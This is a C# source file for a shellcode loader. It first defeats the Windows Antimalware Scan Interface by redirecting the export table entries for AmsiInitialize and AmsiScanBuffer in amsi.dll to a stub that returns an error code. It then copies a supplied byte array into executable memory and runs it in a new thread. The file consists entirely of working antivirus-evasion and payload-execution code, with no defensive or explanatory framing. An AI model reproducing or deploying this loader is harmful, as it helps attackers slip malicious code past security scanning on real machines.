using System;
using System.Buffers.Text;
using System.Runtime.InteropServices;

namespace ConsoleApp
{
    internal class Loader
    {
        public static void RunCode(byte[] data)
        {
            Console.WriteLine("1. Patch...");
            ushort[] ordinals = new ushort[]
            {
                2-1,    // AmsiInitialize
                5-1     // AmsiScanBuffer
            };
            HookExportByOrdinal("amsi.dll", ordinals);

            Console.WriteLine("2. Allocating memory...");
            IntPtr pData = NativeMethods.VirtualAlloc(
                IntPtr.Zero,
                data.Length,
                MemoryProtectionConstants.MEM_COMMIT | MemoryProtectionConstants.MEM_RESERVE,
                MemoryProtectionConstants.PAGE_EXECUTE_READWRITE
            );
            NativeMethods.RtlMoveMemory(pData, data, (uint)data.Length);
            Console.WriteLine($"- Allocated memory: 0x{pData.ToInt64():X}");

            Console.WriteLine("3. Executing code...");
            IntPtr threadHandle = NativeMethods.CreateThread(
                IntPtr.Zero,
                UIntPtr.Zero,
                pData,
                IntPtr.Zero,
                0,
                out uint threadId
            );
            if (threadHandle == IntPtr.Zero)
            {
                Console.WriteLine("CreateThread failed: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine($"- Thread ID: {threadId}");
            NativeMethods.WaitForSingleObject(threadHandle, 0xFFFFFFFF);
            Console.WriteLine("Done!");
        }

        private static void HookExportByOrdinal(string targetModule, ushort[] targetOrdinal)
        {
            Console.WriteLine("1-1. Loading module...");
            IntPtr hModule = NativeMethods.LoadLibraryA(targetModule);
            if (hModule == IntPtr.Zero)
            {
                Console.WriteLine("LoadLibrary failed: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine($"- Target module: 0x{hModule.ToInt64():X}");

            Console.WriteLine("1-2. Writing hook...");
            byte[] patch = new byte[] {
                0xB8, 0xFF, 0xFF, 0x00, 0x80,
                0xC3
            };
            IntPtr pHook = NativeMethods.VirtualAlloc(
                hModule + 0x00020000,
                patch.Length,
                MemoryProtectionConstants.MEM_COMMIT | MemoryProtectionConstants.MEM_RESERVE,
                MemoryProtectionConstants.PAGE_EXECUTE_READWRITE
            );
            if (pHook == IntPtr.Zero)
            {
                Console.WriteLine("VirtualAlloc failed: " + Marshal.GetLastWin32Error());
                return;
            }
            NativeMethods.RtlMoveMemory(pHook, patch, (uint)patch.Length);
            Console.WriteLine($"- Hook address: 0x{pHook.ToInt64():X}");

            // Parse PE headers
            var dosHeader = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(hModule);
            var ntHeaderPtr = hModule + dosHeader.e_lfanew;
            var ntHeaders = Marshal.PtrToStructure<IMAGE_NT_HEADERS64>(ntHeaderPtr);
            var exportDirRva = ntHeaders.OptionalHeader.DataDirectory[0].VirtualAddress;
            var exportDirPtr = hModule + (int)exportDirRva;
            var exports = Marshal.PtrToStructure<IMAGE_EXPORT_DIRECTORY>(exportDirPtr);

            Console.WriteLine("1-3. Iterating...");
            for (int i = 0; i < targetOrdinal.Length; i++)
            {
                Console.WriteLine($"- Target ordinal: {targetOrdinal[i]}");
                ushort ordinal = targetOrdinal[i];
                Console.WriteLine("- Finding target...");
                if (ordinal > exports.NumberOfFunctions)
                {
                    Console.WriteLine($"Error: Ordinal {ordinal} exceeds number of functions {exports.NumberOfFunctions}");
                    NativeMethods.VirtualFree(pHook, 0, 0x8000);
                    return;
                }
                Console.WriteLine("- Installing...");
                IntPtr funcRVAsPtr = hModule + (int)exports.AddressOfFunctions;
                IntPtr eatTarget = funcRVAsPtr + ordinal * 4;
                uint oldProtect;
                if (!NativeMethods.VirtualProtect(eatTarget, (UIntPtr)4, (uint)MemoryProtectionConstants.PAGE_READWRITE, out oldProtect))
                {
                    Console.WriteLine("VirtualProtect failed: " + Marshal.GetLastWin32Error());
                    NativeMethods.VirtualFree(pHook, 0, 0x8000);
                    return;
                }
                uint newValue = (uint)(pHook.ToInt64() - hModule.ToInt64());
                Marshal.WriteInt32(eatTarget, (int)newValue);
                if (!NativeMethods.VirtualProtect(eatTarget, (UIntPtr)4, oldProtect, out oldProtect))
                {
                    Console.WriteLine("VirtualProtect failed: " + Marshal.GetLastWin32Error());
                    NativeMethods.VirtualFree(pHook, 0, 0x8000);
                }
                Console.WriteLine($"{targetModule}!({ordinal + 1}) patched");
            }
            Console.WriteLine("Done!");
        }
    }
}